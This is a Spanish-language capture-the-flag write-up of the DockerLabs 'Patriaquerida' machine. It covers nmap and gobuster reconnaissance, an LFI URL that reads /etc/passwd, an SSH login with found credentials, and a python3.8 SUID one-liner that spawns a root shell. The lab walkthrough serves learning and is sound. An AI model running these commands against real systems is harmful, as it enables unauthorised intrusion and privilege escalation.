## Introducción

Este documento presenta la resolución completa de la máquina **Patriaquerida**, desarrollada por *JuanR* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con un archivo `index.php` que revela la ubicación de un archivo oculto que contiene una contraseña. Además, el parámetro `page` es vulnerable a **LFI (Local File Inclusion)**, permitiendo leer el archivo `/etc/passwd` y obtener un usuario válido.
Combinando usuario y contraseña, se accede al sistema vía SSH como `pinguino`. Una vez dentro, se encuentra una nota con la contraseña del usuario `mario`, permitiendo el movimiento lateral. Finalmente, se identifica que `/usr/bin/python3.8` tiene permisos SUID, lo que permite ejecutar una shell con privilegios de `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Patriaquerida.zip
sudo bash auto_deploy.sh Patriaquerida.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Patriaquerida/{content,exploits,nmap,scripts}
cd Patriaquerida
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763246119/Ports_jrgmae.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763246116/Gobuster_ubyyg1.png)

**Rutas detectadas:**
- `/index.php` — Contiene una pista.
  ![Index.php](https://res.cloudinary.com/dewqswzke/image/upload/v1763246117/IndexPhp_cqip9u.png)
- `/index.html` — Página por defecto de Apache.
  ![Index.html](https://res.cloudinary.com/dewqswzke/image/upload/v1763246117/IndexHtml_xcvc96.png)

En `index.php` se revela la ubicación del archivo `/.hidden_pass`, cuyo contenido es:

![Hidden pass](https://res.cloudinary.com/dewqswzke/image/upload/v1763246116/HidenPass_baoq12.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 LFI para enumeración de usuarios

Se identifica que la aplicación es vulnerable a **LFI** en el parámetro `page`, permitiendo leer `/etc/passwd`:

```
http://172.17.0.2/index.php?page=/etc/passwd
```

![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1763246118/Passwd_ghkk1e.png)

Se obtiene un usuario válido del sistema.

### 2.2 Acceso SSH

Combinando el usuario obtenido con la contraseña encontrada en `/.hidden_pass`, se accede al sistema vía SSH:

```bash
ssh pinguino@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1763246120/Ssh_yh1ifh.png)

---

## Paso 3 — Escalada de privilegios

### 3.1 De pinguino → mario

En el directorio home de `pinguino` se encuentra el archivo `nota_mario.txt`:

![Nota Mario](https://res.cloudinary.com/dewqswzke/image/upload/v1763246118/NotaMario_ywrupg.png)

El archivo contiene la contraseña del usuario `mario`:

```bash
su mario
```

![Mario](https://res.cloudinary.com/dewqswzke/image/upload/v1763246117/Mario_ehe2jk.png)

### 3.2 De mario → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1763246116/Find_nhz7yt.png)

Se identifica que `/usr/bin/python3.8` tiene permisos SUID.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b python -f suid
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763246120/Root_ni6ktj.png)
